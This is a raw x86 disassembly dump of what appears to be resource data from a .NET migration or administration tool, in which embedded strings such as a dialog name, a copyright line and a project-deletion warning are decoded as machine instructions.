  4026d4:	add    BYTE PTR [eax],al
  4026d6:	or     ch,BYTE PTR [edx]
  4026d8:	push   esi
  4026d9:	sub    BYTE PTR [eax],cl
  4026db:	add    BYTE PTR [eax],al
  4026dd:	push   es
  4026de:	jb     0x402679
  4026e0:	add    BYTE PTR [eax],al
  4026e2:	jo     0x402762
  4026e4:	pop    es
  4026e5:	add    BYTE PTR [eax],al
  4026e7:	add    al,0x6f
  4026e9:	dec    ecx
  4026ea:	add    BYTE PTR [eax],al
  4026ec:	or     ch,BYTE PTR [edx]
  4026ee:	push   esi
  4026ef:	sub    BYTE PTR [eax],cl
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	push   es
  4026f4:	jb     0x4026ab
  4026f6:	add    BYTE PTR [eax],al
  4026f8:	jo     0x402778
  4026fa:	pop    es
  4026fb:	add    BYTE PTR [eax],al
  4026fd:	add    al,0x6f
  4026ff:	dec    ecx
  402700:	add    BYTE PTR [eax],al
  402702:	or     ch,BYTE PTR [edx]
  402704:	push   esi
  402705:	sub    BYTE PTR [eax],cl
  402707:	add    BYTE PTR [eax],al
  402709:	push   es
  40270a:	jb     0x4026f5
  40270c:	add    BYTE PTR [eax],al
  40270e:	jo     0x40278e
  402710:	pop    es
  402711:	add    BYTE PTR [eax],al
  402713:	add    al,0x6f
  402715:	dec    ecx
  402716:	add    BYTE PTR [eax],al
  402718:	or     ch,BYTE PTR [edx]
  40271a:	push   esi
  40271b:	sub    BYTE PTR [eax],cl
  40271d:	add    BYTE PTR [eax],al
  40271f:	push   es
  402720:	jb     0x402727
  402722:	add    DWORD PTR [eax],eax
  402724:	jo     0x4027a4
  402726:	pop    es
  402727:	add    BYTE PTR [eax],al
  402729:	add    al,0x6f
  40272b:	dec    ecx
  40272c:	add    BYTE PTR [eax],al
  40272e:	or     ch,BYTE PTR [edx]
  402730:	push   esi
  402731:	sub    BYTE PTR [eax],cl
  402733:	add    BYTE PTR [eax],al
  402735:	push   es
  402736:	jb     0x40274f
  402738:	add    DWORD PTR [eax],eax
  40273a:	jo     0x4027ba
  40273c:	pop    es
  40273d:	add    BYTE PTR [eax],al
  40273f:	add    al,0x6f
  402741:	dec    ecx
  402742:	add    BYTE PTR [eax],al
  402744:	or     ch,BYTE PTR [edx]
  402746:	push   esi
  402747:	sub    BYTE PTR [eax],cl
  402749:	add    BYTE PTR [eax],al
  40274b:	push   es
  40274c:	jb     0x402799
  40274e:	add    DWORD PTR [eax],eax
  402750:	jo     0x4027d0
  402752:	pop    es
  402753:	add    BYTE PTR [eax],al
  402755:	add    al,0x6f
  402757:	dec    ecx
  402758:	add    BYTE PTR [eax],al
  40275a:	or     ch,BYTE PTR [edx]
  40275c:	push   esi
  40275d:	sub    BYTE PTR [eax],cl
  40275f:	add    BYTE PTR [eax],al
  402761:	push   es
  402762:	jb     0x4027cb
  402764:	add    DWORD PTR [eax],eax
  402766:	jo     0x4027e6
  402768:	pop    es
  402769:	add    BYTE PTR [eax],al
  40276b:	add    al,0x6f
  40276d:	dec    ecx
  40276e:	add    BYTE PTR [eax],al
  402770:	or     ch,BYTE PTR [edx]
  402772:	push   esi
  402773:	sub    BYTE PTR [eax],cl
  402775:	add    BYTE PTR [eax],al
  402777:	push   es
  402778:	jb     0x4027ed
  40277a:	add    DWORD PTR [eax],eax
  40277c:	jo     0x4027fc
  40277e:	pop    es
  40277f:	add    BYTE PTR [eax],al
  402781:	add    al,0x6f
  402783:	dec    ecx
  402784:	add    BYTE PTR [eax],al
  402786:	or     ch,BYTE PTR [edx]
  402788:	push   esi
  402789:	sub    BYTE PTR [eax],cl
  40278b:	add    BYTE PTR [eax],al
  40278d:	push   es
  40278e:	jb     0x402711
  402790:	add    DWORD PTR [eax],eax
  402792:	jo     0x402812
  402794:	pop    es
  402795:	add    BYTE PTR [eax],al
  402797:	add    al,0x6f
  402799:	dec    ecx
  40279a:	add    BYTE PTR [eax],al
  40279c:	or     ch,BYTE PTR [edx]
  40279e:	push   esi
  40279f:	sub    BYTE PTR [eax],cl
  4027a1:	add    BYTE PTR [eax],al
  4027a3:	push   es
  4027a4:	jb     0x402747
  4027a6:	add    DWORD PTR [eax],eax
  4027a8:	jo     0x402828
  4027aa:	pop    es
  4027ab:	add    BYTE PTR [eax],al
  4027ad:	add    al,0x6f
  4027af:	dec    ecx
  4027b0:	add    BYTE PTR [eax],al
  4027b2:	or     ch,BYTE PTR [edx]
  4027b4:	push   esi
  4027b5:	sub    BYTE PTR [eax],cl
  4027b7:	add    BYTE PTR [eax],al
  4027b9:	push   es
  4027ba:	jb     0x402773
  4027bc:	add    DWORD PTR [eax],eax
  4027be:	jo     0x40283e
  4027c0:	pop    es
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	add    al,0x6f
  4027c5:	dec    ecx
  4027c6:	add    BYTE PTR [eax],al
  4027c8:	or     ch,BYTE PTR [edx]
  4027ca:	push   esi
  4027cb:	sub    BYTE PTR [eax],cl
  4027cd:	add    BYTE PTR [eax],al
  4027cf:	push   es
  4027d0:	jb     0x4027b7
  4027d2:	add    DWORD PTR [eax],eax
  4027d4:	jo     0x402854
  4027d6:	pop    es
  4027d7:	add    BYTE PTR [eax],al
  4027d9:	add    al,0x6f
  4027db:	dec    ecx
  4027dc:	add    BYTE PTR [eax],al
  4027de:	or     ch,BYTE PTR [edx]
  4027e0:	push   esi
  4027e1:	sub    BYTE PTR [eax],cl
  4027e3:	add    BYTE PTR [eax],al
  4027e5:	push   es
  4027e6:	jb     0x4027ef
  4027e8:	add    al,BYTE PTR [eax]
  4027ea:	jo     0x40286a
  4027ec:	pop    es
  4027ed:	add    BYTE PTR [eax],al
  4027ef:	add    al,0x6f
  4027f1:	dec    ecx
  4027f2:	add    BYTE PTR [eax],al
  4027f4:	or     ch,BYTE PTR [edx]
  4027f6:	push   esi
  4027f7:	sub    BYTE PTR [eax],cl
  4027f9:	add    BYTE PTR [eax],al
  4027fb:	push   es
  4027fc:	jb     0x40281b
  4027fe:	add    al,BYTE PTR [eax]
  402800:	jo     0x402880
  402802:	pop    es
  402803:	add    BYTE PTR [eax],al
  402805:	add    al,0x6f
  402807:	dec    ecx
  402808:	add    BYTE PTR [eax],al
  40280a:	or     ch,BYTE PTR [edx]
  40280c:	add    BYTE PTR [eax],al
  40280e:	add    BYTE PTR [eax],al
  402810:	inc    ebx
  402811:	or     al,BYTE PTR [eax]
  402813:	add    dh,cl
  402815:	retf   0xbeef
  402818:	add    DWORD PTR [eax],eax
  40281a:	add    BYTE PTR [eax],al
  40281c:	xchg   ecx,eax
  40281d:	add    BYTE PTR [eax],al
  40281f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  402823:	jae    0x402899
  402825:	gs ins DWORD PTR es:[edi],dx
  402827:	cs push edx
  402829:	gs jae 0x40289b
  40282c:	jne    0x4028a0
  40282e:	arpl   WORD PTR [ebp+0x73],sp
  402831:	cs push edx
  402833:	gs jae 0x4028a5
  402836:	jne    0x4028aa
  402838:	arpl   WORD PTR [ebp+0x52],sp
  40283b:	gs popa 
  40283d:	fs gs jb 0x40286d
  402841:	and    BYTE PTR [ebp+0x73],ch
  402844:	arpl   WORD PTR [edi+0x72],bp
  402847:	ins    BYTE PTR es:[edi],dx
  402848:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40284f:	jae    0x4028ba
  402851:	outs   dx,DWORD PTR ds:[esi]
  402852:	outs   dx,BYTE PTR ds:[esi]
  402853:	cmp    eax,0x2e302e34
  402858:	xor    BYTE PTR [esi],ch
  40285a:	xor    BYTE PTR [eax+eiz*1],ch
  40285d:	inc    ebx
  40285e:	jne    0x4028cc
  402860:	je     0x4028d7
  402862:	jb     0x4028c9
  402864:	cmp    eax,0x7475656e
  402869:	jb     0x4028cc
  40286b:	ins    BYTE PTR es:[edi],dx
  40286c:	sub    al,0x20
  40286e:	push   eax
  40286f:	jne    0x4028d3
  402871:	ins    BYTE PTR es:[edi],dx
  402872:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  402879:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40287d:	bound  esi,QWORD PTR [edi]
  40287f:	aaa    
  402880:	popa   
  402881:	xor    eax,0x31363563
  402886:	cmp    DWORD PTR [ebx],esi
  402888:	xor    al,0x65
  40288a:	xor    BYTE PTR [eax],bh
  40288c:	cmp    DWORD PTR [ebx],esp
  40288e:	push   ebx
  40288f:	jns    0x402904
  402891:	je     0x4028f8
  402893:	ins    DWORD PTR es:[edi],dx
  402894:	cs push edx
  402896:	gs jae 0x402908
  402899:	jne    0x40290d
  40289b:	arpl   WORD PTR [ebp+0x73],sp
  40289e:	cs push edx
  4028a0:	jne    0x402910
  4028a2:	je     0x40290d
  4028a4:	ins    DWORD PTR es:[edi],dx
  4028a5:	gs push edx
  4028a7:	gs jae 0x402919
  4028aa:	jne    0x40291e
  4028ac:	arpl   WORD PTR [ebp+0x53],sp
  4028af:	gs je  0x4028b4
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	add    BYTE PTR [edi],cl
  4028b6:	add    BYTE PTR [eax],al
  4028b8:	add    BYTE PTR [eax],al
  4028ba:	add    BYTE PTR [eax],al
  4028bc:	add    BYTE PTR [eax+0x41],dl
  4028bf:	inc    esp
  4028c0:	push   eax
  4028c1:	inc    ecx
  4028c2:	inc    esp
  4028c3:	push   eax
  4028c4:	outs   dx,DWORD PTR ds:[esi]
  4028c5:	call   0x5e11a950
  4028ca:	dec    esp
  4028cb:	lahf   
  4028cc:	(bad)  
  4028cd:	out    0xc6,al
  4028cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d0:	adc    cl,ah
  4028d2:	out    0xae,eax
  4028d4:	push   ecx
  4028d5:	add    dh,bl
  4028d7:	retf   
  4028d8:	out    0x40,al
  4028da:	mov    esi,0xd93ed6d6
  4028df:	loopne 0x4028d9
  4028e1:	dec    esp
  4028e2:	pop    edi
  4028e3:	cli    
  4028e4:	and    al,cl
  4028e6:	push   cs
  4028e7:	or     eax,0x144c1b2e
  4028ec:	xchg   edx,eax
  4028ed:	in     al,0x2a
  4028ef:	cmp    BYTE PTR [ebp+0x68],bh
  4028f2:	xor    eax,0x16b1bc3d
  4028f7:	add    edx,DWORD PTR ds:[edx]
  4028fa:	repz inc esp
  4028fc:	push   ecx
  4028fd:	lea    ebx,[esi+0x4d]
  402900:	xor    BYTE PTR [eax],al
  402902:	add    BYTE PTR [eax],al
  402904:	add    BYTE PTR [eax],al
  402906:	add    BYTE PTR [eax],al
  402908:	adc    DWORD PTR [eax],eax
  40290a:	add    BYTE PTR [eax],al
  40290c:	add    BYTE PTR [ecx],al
  40290e:	add    BYTE PTR [eax],al
  402910:	add    BYTE PTR [bx+si],al
  402913:	add    BYTE PTR [ebx-0x44000000],bl
  402919:	add    DWORD PTR [eax],eax
  40291b:	add    BYTE PTR [esi-0xf000000],al
  402921:	add    BYTE PTR [eax],al
  402923:	add    dl,dl
  402925:	add    BYTE PTR [eax],al
  402927:	add    BYTE PTR [esi+0x1],bh
  40292a:	add    BYTE PTR [eax],al
  40292c:	xor    al,0x1
  40292e:	add    BYTE PTR [eax],al
  402930:	mov    ds:0x4d000001,eax
  402935:	add    DWORD PTR [eax],eax
  402937:	add    BYTE PTR [ecx],dl
  402939:	add    DWORD PTR [eax],eax
  40293b:	add    bh,bh
  40293d:	add    al,BYTE PTR [eax]
  40293f:	add    BYTE PTR [edx+eax*2],cl
  402942:	add    BYTE PTR [ecx+0x0],ah
  402945:	outs   dx,BYTE PTR ds:[esi]
  402946:	add    BYTE PTR [esi+0x0],ch
  402949:	add    BYTE PTR gs:[edx+0x0],dh
  40294d:	add    BYTE PTR [eax],al
  40294f:	add    BYTE PTR [eax],al
  402951:	sbb    al,BYTE PTR [eax+eax*1+0x65]
  402955:	add    BYTE PTR [eax+eax*1+0x65],ch
  402959:	add    BYTE PTR [eax+eax*1+0x65],dh
  40295d:	add    BYTE PTR [edi+0x0],dl
  402960:	popa   
  402961:	add    BYTE PTR [edx+0x0],dh
  402964:	outs   dx,BYTE PTR ds:[esi]
  402965:	add    BYTE PTR [ecx+0x0],ch
  402968:	outs   dx,BYTE PTR ds:[esi]
  402969:	add    BYTE PTR [edi+0x0],ah
  40296c:	outs   dx,BYTE PTR ds:[esi]
  40296d:	add    BYTE PTR [eax],al
  40296f:	add    BYTE PTR [edx],dh
  402971:	inc    esp
  402972:	add    BYTE PTR [ebp+0x0],ah
  402975:	ins    BYTE PTR es:[edi],dx
  402976:	add    BYTE PTR [ebp+0x0],ah
  402979:	je     0x40297b
  40297b:	add    BYTE PTR gs:[edi+0x0],dl
  40297f:	jae    0x402981
  402981:	jae    0x402983
  402983:	push   ebx
  402984:	add    BYTE PTR [ecx+0x0],ch
  402987:	je     0x402989
  402989:	add    BYTE PTR gs:[ebx+0x0],al
  40298d:	outs   dx,DWORD PTR ds:[esi]
  40298e:	add    BYTE PTR [esi+0x0],ch
  402991:	data16 add BYTE PTR [ecx+0x0],ch
  402995:	jb     0x402997
  402997:	ins    DWORD PTR es:[edi],dx
  402998:	add    BYTE PTR [ecx+0x0],ah
  40299b:	je     0x40299d
  40299d:	imul   eax,DWORD PTR [eax],0x6e006f
  4029a3:	mov    esi,0x1a000001
  4029a8:	dec    ecx
  4029a9:	add    BYTE PTR [esi+0x0],ch
  4029ac:	jbe    0x4029ae
  4029ae:	popa   
  4029af:	add    BYTE PTR [eax+eax*1+0x69],ch
  4029b3:	add    BYTE PTR [eax+eax*1+0x53],ah
  4029b7:	add    BYTE PTR [ebp+0x0],ah
  4029ba:	jb     0x4029bc
  4029bc:	jbe    0x4029be
  4029be:	add    BYTE PTR gs:[edx+0x0],dh
  4029c2:	inc    ebp
  4029c3:	add    al,BYTE PTR [eax]
  4029c5:	add    BYTE PTR [eax],dl
  4029c7:	dec    esi
  4029c8:	add    BYTE PTR [edi+0x0],ch
  4029cb:	inc    ecx
  4029cc:	add    BYTE PTR [esi+0x0],ch
  4029cf:	jae    0x4029d1
  4029d1:	ja     0x4029d3
  4029d3:	add    BYTE PTR gs:[edx+0x0],dh
  4029d7:	mov    BYTE PTR [ebx],al
  4029d9:	add    BYTE PTR [eax],al
  4029db:	xor    cl,BYTE PTR [edi+0x0]
  4029de:	bound  eax,QWORD PTR [eax]
  4029e0:	jae    0x4029e2
  4029e2:	outs   dx,DWORD PTR ds:[esi]
  4029e3:	add    BYTE PTR [eax+eax*1+0x65],ch
  4029e7:	add    BYTE PTR [eax+eax*1+0x65],dh
  4029eb:	add    BYTE PTR [ebx+0x0],al
  4029ee:	outs   dx,DWORD PTR ds:[esi]
  4029ef:	add    BYTE PTR [ebp+0x0],ch
  4029f2:	ins    DWORD PTR es:[edi],dx
  4029f3:	add    BYTE PTR [ecx+0x0],ah
  4029f6:	outs   dx,BYTE PTR ds:[esi]
  4029f7:	add    BYTE PTR [eax+eax*1+0x4c],ah
  4029fb:	add    BYTE PTR [ecx+0x0],ch
  4029fe:	outs   dx,BYTE PTR ds:[esi]
  4029ff:	add    BYTE PTR [ebp+0x0],ah
  402a02:	dec    edi
  402a03:	add    BYTE PTR [eax+0x0],dh
  402a06:	je     0x402a08
  402a08:	imul   eax,DWORD PTR [eax],0x6e006f
  402a0e:	mov    eax,DWORD PTR [ebx]
  402a10:	add    BYTE PTR [eax],al
  402a12:	sbb    dl,BYTE PTR [ebp+0x0]
  402a15:	outs   dx,BYTE PTR ds:[esi]
  402a16:	add    BYTE PTR [ebx+0x0],ch
  402a19:	outs   dx,BYTE PTR ds:[esi]
  402a1a:	add    BYTE PTR [edi+0x0],ch
  402a1d:	ja     0x402a1f
  402a1f:	outs   dx,BYTE PTR ds:[esi]
  402a20:	add    BYTE PTR [edi+0x0],cl
  402a23:	jo     0x402a25
  402a25:	je     0x402a27
  402a27:	imul   eax,DWORD PTR [eax],0x6e006f
  402a2d:	retf   
  402a2e:	add    eax,DWORD PTR [eax]
  402a30:	add    BYTE PTR [edx],cl
  402a32:	push   ebp
  402a33:	add    BYTE PTR [ebx+0x0],dh
  402a36:	popa   
  402a37:	add    BYTE PTR [edi+0x0],ah
  402a3a:	gs add dh,ah
  402a3d:	add    eax,DWORD PTR [eax]
  402a3f:	add    BYTE PTR [edx*2+0x61007300],cl
  402a46:	add    BYTE PTR [edi+0x0],ah
  402a49:	add    BYTE PTR gs:[edx],dh
  402a4c:	add    BYTE PTR [ecx+0x4],al
  402a4f:	add    BYTE PTR [eax],al
  402a51:	push   ds
  402a52:	push   ebp
  402a53:	add    BYTE PTR [ebx+0x0],dh
  402a56:	popa   
  402a57:	add    BYTE PTR [edi+0x0],ah
  402a5a:	add    BYTE PTR gs:[ebp+0x0],al
  402a5e:	js     0x402a60
  402a60:	arpl   WORD PTR [eax],ax
  402a62:	ins    BYTE PTR es:[edi],dx
  402a63:	add    BYTE PTR [ebp+0x0],dh
  402a66:	add    BYTE PTR fs:[ebp+0x0],ah
  402a6a:	push   edi
  402a6b:	add    BYTE PTR [ebx+0x0],dh
  402a6e:	jae    0x402a70
  402a70:	xchg   BYTE PTR ds:0x55140000,al
  402a76:	add    BYTE PTR [ebx+0x0],dh
  402a79:	popa   
  402a7a:	add    BYTE PTR [edi+0x0],ah
  402a7d:	add    BYTE PTR gs:[esi+0x0],al
  402a81:	outs   dx,DWORD PTR ds:[esi]
  402a82:	add    BYTE PTR [edx+0x0],dh
  402a85:	arpl   WORD PTR [eax],ax
  402a87:	add    BYTE PTR gs:[ebx],bh
  402a8a:	push   es
  402a8b:	add    BYTE PTR [eax],al
  402a8d:	sub    al,0x55
  402a8f:	add    BYTE PTR [ebx+0x0],dh
  402a92:	popa   
  402a93:	add    BYTE PTR [edi+0x0],ah
  402a96:	add    BYTE PTR gs:[eax+0x0],dl
  402a9a:	jb     0x402a9c
  402a9c:	outs   dx,DWORD PTR ds:[esi]
  402a9d:	add    BYTE PTR [edx+0x0],ch
  402aa0:	add    BYTE PTR gs:[ebx+0x0],ah
  402aa4:	je     0x402aa6
  402aa6:	inc    ebx
  402aa7:	add    BYTE PTR [edi+0x0],ch
  402aaa:	ins    BYTE PTR es:[edi],dx
  402aab:	add    BYTE PTR [eax+eax*1+0x65],ch
  402aaf:	add    BYTE PTR [ebx+0x0],ah
  402ab2:	je     0x402ab4
  402ab4:	imul   eax,DWORD PTR [eax],0x6e006f
  402aba:	js     0x402ac2
  402abc:	add    BYTE PTR [eax],al
  402abe:	and    BYTE PTR [ebp+0x0],dl
  402ac1:	jae    0x402ac3
  402ac3:	popa   
  402ac4:	add    BYTE PTR [edi+0x0],ah
  402ac7:	add    BYTE PTR gs:[eax+0x0],dl
  402acb:	jb     0x402acd
  402acd:	outs   dx,DWORD PTR ds:[esi]
  402ace:	add    BYTE PTR [edx+0x0],ch
  402ad1:	add    BYTE PTR gs:[ebx+0x0],ah
  402ad5:	je     0x402ad7
  402ad7:	dec    esi
  402ad8:	add    BYTE PTR [ecx+0x0],ah
  402adb:	ins    DWORD PTR es:[edi],dx
  402adc:	add    BYTE PTR [ebp+0x0],ah
  402adf:	mov    bh,0x6
  402ae1:	add    BYTE PTR [eax],al
  402ae3:	adc    al,0x55
  402ae5:	add    BYTE PTR [ebx+0x0],dh
  402ae8:	popa   
  402ae9:	add    BYTE PTR [edi+0x0],ah
  402aec:	add    BYTE PTR gs:[ecx+0x0],dl
  402af0:	jne    0x402af2
  402af2:	imul   eax,DWORD PTR [eax],0x740065
  402af8:	push   ss
  402af9:	pop    es
  402afa:	add    BYTE PTR [eax],al
  402afc:	adc    bl,BYTE PTR [ecx+0x0]
  402aff:	add    BYTE PTR gs:[ebx+0x0],dh
  402b03:	inc    ecx
  402b04:	add    BYTE PTR [esi+0x0],ch
  402b07:	jae    0x402b09
  402b09:	ja     0x402b0b
  402b0b:	add    BYTE PTR gs:[edx+0x0],dh
  402b0f:	inc    ecx
  402b10:	pop    es
  402b11:	add    BYTE PTR [eax],al
  402b13:	add    DWORD PTR [ebp+ecx*2+0x69],ebp
  402b17:	arpl   WORD PTR [edx+0x6f],si
  402b1a:	jae    0x402b8b
  402b1c:	data16 je 0x402b3f
  402b1f:	sub    BYTE PTR [edx+0x29],dl
  402b22:	and    BYTE PTR [ebp+eiz*2+0x61],dl
  402b26:	ins    DWORD PTR es:[edi],dx
  402b27:	and    BYTE PTR [esi+0x6f],al
  402b2a:	jne    0x402b9a
  402b2c:	fs popa 
  402b2e:	je     0x402b99
  402b30:	outs   dx,DWORD PTR ds:[esi]
  402b31:	outs   dx,BYTE PTR ds:[esi]
  402b32:	and    BYTE PTR [ebp+eiz*2+0x6c],al
  402b36:	gs je  0x402b9e
  402b39:	and    BYTE PTR [eax+0x72],dl
  402b3c:	outs   dx,DWORD PTR ds:[esi]
  402b3d:	push   0x65
  402b3f:	arpl   WORD PTR [eax+eiz*1+0x54],si
  402b43:	outs   dx,DWORD PTR ds:[esi]
  402b44:	outs   dx,DWORD PTR ds:[esi]
  402b45:	ins    BYTE PTR es:[edi],dx
  402b46:	or     eax,0x706f430a
  402b4b:	jns    0x402bbf
  402b4d:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  402b54:	sub    DWORD PTR [eax],esp
  402b56:	dec    ebp
  402b57:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402b5e:	je     0x402b80
  402b60:	inc    ebx
  402b61:	outs   dx,DWORD PTR ds:[esi]
  402b62:	jb     0x402bd4
  402b64:	outs   dx,DWORD PTR ds:[esi]
  402b65:	jb     0x402bc8
  402b67:	je     0x402bd2
  402b69:	outs   dx,DWORD PTR ds:[esi]
  402b6a:	outs   dx,BYTE PTR ds:[esi]
  402b6b:	and    BYTE PTR cs:[ecx+0x6c],al
  402b6f:	ins    BYTE PTR es:[edi],dx
  402b70:	and    BYTE PTR [edx+0x69],dh
  402b73:	addr16 push 0x72207374
  402b79:	gs jae 0x402be1
  402b7c:	jb     0x402bf4
  402b7e:	gs fs cs add ebp,ecx
  402b83:	add    dl,BYTE PTR [edi+0x61]
  402b86:	jb     0x402bf6
  402b88:	imul   ebp,DWORD PTR [esi+0x67],0x6544203a
  402b8f:	ins    BYTE PTR es:[edi],dx
  402b90:	gs je  0x402bfc
  402b93:	outs   dx,BYTE PTR ds:[esi]
  402b94:	and    BYTE PTR [bx+di+0x20],ah
  402b98:	je     0x402bff
  402b9a:	popa   
  402b9b:	ins    DWORD PTR es:[edi],dx
  402b9c:	and    BYTE PTR [eax+0x72],dh
  402b9f:	outs   dx,DWORD PTR ds:[esi]
  402ba0:	push   0x65
  402ba2:	arpl   WORD PTR [eax+eiz*1+0x69],si
  402ba6:	jae    0x402bc8
  402ba8:	popa   
  402ba9:	outs   dx,BYTE PTR ds:[esi]
  402baa:	and    BYTE PTR [ecx+0x72],ch
  402bad:	jb     0x402c14
  402baf:	arpl   WORD PTR [edi+0x76],bp
  402bb2:	gs jb  0x402c16
  402bb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  402bb9:	outs   dx,DWORD PTR ds:[esi]
  402bba:	jo     0x402c21
  402bbc:	jb     0x402c1f
  402bbe:	je     0x402c29
  402bc0:	outs   dx,DWORD PTR ds:[esi]
  402bc1:	outs   dx,BYTE PTR ds:[esi]
  402bc2:	and    BYTE PTR cs:[ecx+0x6c],al
  402bc6:	ins    BYTE PTR es:[edi],dx
  402bc7:	and    BYTE PTR [esi+0x65],dh
  402bca:	jb     0x402c3f
  402bcc:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f6320
  402bd3:	je     0x402c47
  402bd5:	outs   dx,DWORD PTR ds:[esi]
  402bd6:	ins    BYTE PTR es:[edi],dx
  402bd7:	sub    al,0x20
  402bd9:	ja     0x402c4a
  402bdb:	jb     0x402c48
  402bdd:	and    BYTE PTR [ecx+0x74],ch
  402be0:	gs ins DWORD PTR es:[edi],dx
  402be2:	and    BYTE PTR [edx+esi*2+0x61],dh
  402be6:	arpl   WORD PTR [ebx+0x69],bp
  402be9:	outs   dx,BYTE PTR ds:[esi]
  402bea:	and    BYTE PTR [bx+di+0x6e],ah
  402bee:	and    BYTE PTR fs:[ebp+eiz*2+0x61],dl
  402bf3:	ins    DWORD PTR es:[edi],dx
  402bf4:	and    BYTE PTR [esi+0x6f],al
  402bf7:	jne    0x402c67
  402bf9:	fs popa 
  402bfb:	je     0x402c66
  402bfd:	outs   dx,DWORD PTR ds:[esi]
  402bfe:	outs   dx,BYTE PTR ds:[esi]
  402bff:	and    BYTE PTR [edx+0x75],ah
  402c02:	imul   ebp,DWORD PTR [esp+eiz*2+0x20],0x61746164
  402c0a:	and    BYTE PTR [edi+0x69],dh
  402c0d:	ins    BYTE PTR es:[edi],dx
  402c0e:	ins    BYTE PTR es:[edi],dx
  402c0f:	and    BYTE PTR [edx+0x65],ah
  402c12:	and    BYTE PTR [ebp+eiz*2+0x73],ah
  402c16:	je     0x402c8a
  402c18:	outs   dx,DWORD PTR ds:[esi]
  402c19:	jns    0x402c80
  402c1b:	and    BYTE PTR fs:[esi+0x72],ah
  402c1f:	outs   dx,DWORD PTR ds:[esi]
  402c20:	ins    DWORD PTR es:[edi],dx
  402c21:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402c25:	and    BYTE PTR [ebx+0x79],dh
  402c28:	jae    0x402c9e
  402c2a:	gs ins DWORD PTR es:[edi],dx
  402c2c:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  402c31:	and    BYTE PTR [edi+0x6e],ch
  402c34:	ins    BYTE PTR es:[edi],dx
  402c35:	jns    0x402c57
  402c37:	ja     0x402c9a
  402c39:	jns    0x402c5b
  402c3b:	je     0x402cac
  402c3d:	and    BYTE PTR [edx+0x65],dh
  402c40:	arpl   WORD PTR [edi+0x76],bp
  402c43:	gs jb  0x402c66
  402c46:	je     0x402cb0
  402c48:	imul   esi,DWORD PTR [ebx+0x20],0x61746164
  402c4f:	and    BYTE PTR [ecx+0x73],ch
  402c52:	and    BYTE PTR [edx+0x79],ah
  402c55:	and    BYTE PTR [edx+0x65],dh
  402c58:	jae    0x402cce
  402c5a:	outs   dx,DWORD PTR ds:[esi]
  402c5b:	jb     0x402cc6
  402c5d:	outs   dx,BYTE PTR ds:[esi]
  402c5e:	and    BYTE PTR [bx+di+0x20],ah
  402c62:	jae    0x402cd8
  402c64:	outs   dx,DWORD PTR ds:[esi]
  402c65:	jb     0x402ccc
  402c67:	and    BYTE PTR fs:[edx+0x61],ah
  402c6b:	arpl   WORD PTR [ebx+0x75],bp
  402c6e:	jo     0x402c90
  402c70:	outs   dx,DWORD PTR ds:[esi]
  402c71:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  402c76:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  402c7a:	popa   
  402c7b:	bound  esp,QWORD PTR [ecx+0x73]
  402c7e:	gs jae 0x402caf
  402c81:	and    BYTE PTR [ecx+0x72],al
  402c84:	and    BYTE PTR gs:[ecx+0x6f],bh
  402c88:	jne    0x402caa
  402c8a:	jae    0x402d01
  402c8c:	jb     0x402cf3
  402c8e:	and    BYTE PTR [ecx+0x6f],bh
  402c91:	jne    0x402cb3
  402c93:	ja     0x402cf6
  402c95:	outs   dx,BYTE PTR ds:[esi]
  402c96:	je     0x402cb8
  402c98:	je     0x402d09
  402c9a:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  402c9e:	gs je  0x402d06
  402ca1:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402ca5:	and    BYTE PTR [ebp+eiz*2+0x61],dh
  402ca9:	ins    DWORD PTR es:[edi],dx
  402caa:	and    BYTE PTR [eax+0x72],dh
  402cad:	outs   dx,DWORD PTR ds:[esi]
  402cae:	push   0x65
  402cb0:	arpl   WORD PTR [eax+eiz*1+0x61],si
  402cb4:	outs   dx,BYTE PTR ds:[esi]
  402cb5:	and    BYTE PTR fs:[ecx+0x6c],ah
  402cb9:	ins    BYTE PTR es:[edi],dx
  402cba:	and    BYTE PTR [edi+0x66],ch
  402cbd:	and    BYTE PTR [ecx+0x74],ch
  402cc0:	jae    0x402ce2
  402cc2:	fs popa 
  402cc4:	je     0x402d27
  402cc6:	and    BYTE PTR [eax],ch
  402cc8:	jnp    0x402cfa
  402cca:	jge    0x402cfb
  402ccc:	jnp    0x402cff
  402cce:	jge    0x402cf9
  402cd0:	aas    
  402cd1:	add    DWORD PTR [ecx+eax*1+0x72616853],eax
  402cd8:	gs push eax
  402cda:	outs   dx,DWORD PTR ds:[esi]
  402cdb:	imul   ebp,DWORD PTR [esi+0x74],0x74697320
  402ce2:	gs jae 0x402d05
  402ce5:	arpl   WORD PTR [ecx+0x6e],sp
  402ce8:	and    BYTE PTR [edx+0x65],ah
  402ceb:	and    BYTE PTR [ebx+0x68],dh
  402cee:	popa   
  402cef:	jb     0x402d56
  402cf1:	and    BYTE PTR fs:[edx+0x79],ah
  402cf5:	and    BYTE PTR [ebp+0x75],ch
  402cf8:	ins    BYTE PTR es:[edi],dx
  402cf9:	je     0x402d64
  402cfb:	jo     0x402d69
  402cfd:	and    BYTE PTR gs:[eax+0x72],dh
  402d01:	outs   dx,DWORD PTR ds:[esi]
  402d02:	push   0x65
  402d04:	arpl   WORD PTR [ebx+esi*2+0x2e],si
  402d08:	and    BYTE PTR [ecx+0x72],al
  402d0b:	and    BYTE PTR gs:[ecx+0x6f],bh
  402d0f:	jne    0x402d31
  402d11:	jae    0x402d88
  402d13:	jb     0x402d7a
  402d15:	and    BYTE PTR [ecx+0x6f],bh
  402d18:	jne    0x402d3a
  402d1a:	ja     0x402d7d
  402d1c:	outs   dx,BYTE PTR ds:[esi]
  402d1d:	je     0x402d3f
  402d1f:	je     0x402d90
  402d21:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  402d25:	gs je  0x402d8d
